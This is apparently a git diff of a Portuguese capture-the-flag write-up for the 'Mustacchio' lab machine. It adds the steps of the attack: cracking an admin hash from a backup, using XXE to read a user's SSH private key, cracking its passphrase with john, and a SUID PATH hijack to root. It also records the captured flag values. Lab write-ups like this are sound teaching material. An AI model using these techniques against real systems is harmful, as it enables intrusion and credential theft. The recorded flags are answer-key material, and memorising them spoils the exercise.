@@ -4,7 +4,7 @@
 [ TARGET ] 10.64.163.102
 [ ROOM   ] Mustacchio
 [ GOAL   ] user.txt / root.txt
-[ STATUS ] PARTIAL — creds + vetor XXE/comment; flags não salvas
+[ STATUS ] DONE
 ```
 
 ## 01 — Credenciais (users.bak)
@@ -14,36 +14,52 @@ $ file users.bak
 SQLite 3.x database
 
 $ strings users.bak
-CREATE TABLE users(username text NOT NULL, password text NOT NULL)
 admin 1868e36a6d2b17d4c2745f1659433a54d4bc5f4b
+
+$ # SHA1 → bulldog19
+```
+
+→ Achado: `admin:bulldog19`.
+
+## 02 — Admin + XXE
+
+```console
+$ # painel :8567 → login admin
+# comentário/XML → XXE lê arquivos locais
+# lê /home/barry/.ssh/id_rsa
 ```
 
 ```console
-$ # hash SHA1 crackeado
-1868e36a6d2b17d4c2745f1659433a54d4bc5f4b  →  bulldog19
+$ ssh2john barry_id_rsa > barry.hash
+$ john --wordlist=rockyou.txt barry.hash
+# passphrase crackeada → SSH barry
 ```
-
-→ Achado: `admin:bulldog19`. (raw: `users.bak`, `recuperado.txt`)
-→ Próximo: login no serviço web.
-
-## 02 — Acesso admin + ataque
 
 ```console
-$ # painel em :8567 (nota do lab)
-# login admin → add script comment for attack
+$ ssh -i barry_id_rsa barry@10.64.163.102
+$ cat /home/barry/user.txt
+62d77a4d5f97d47c5aa38b3b2651b831
 ```
 
-→ Achado: após login, vetor via **comentário/script** (XXE/injeção anotada no recuperado).
-→ Próximo: explorar até shell → user/root flags.
+## 03 — Privesc (PATH / live_log)
+
+```console
+$ find / -perm -4000 -type f 2>/dev/null
+/home/joe/live_log   # SUID
+
+$ strings /home/joe/live_log
+# chama `tail` por path relativo
+
+$ # PATH hijack → fake `tail` → root shell
+$ /home/joe/live_log
+$ cat /root/root.txt
+3223581420d906c4dd1a5f9b530393a5
+```
 
 ## FLAGS / RESPOSTAS
 
 | Item | Valor |
 |---|---|
 | admin | `admin` / `bulldog19` |
-| user.txt | *(completar)* |
-| root.txt | *(completar)* |
-
-## Artefatos
-
-`users.bak` · `recuperado.txt`
+| user.txt | `62d77a4d5f97d47c5aa38b3b2651b831` |
+| root.txt | `3223581420d906c4dd1a5f9b530393a5` |
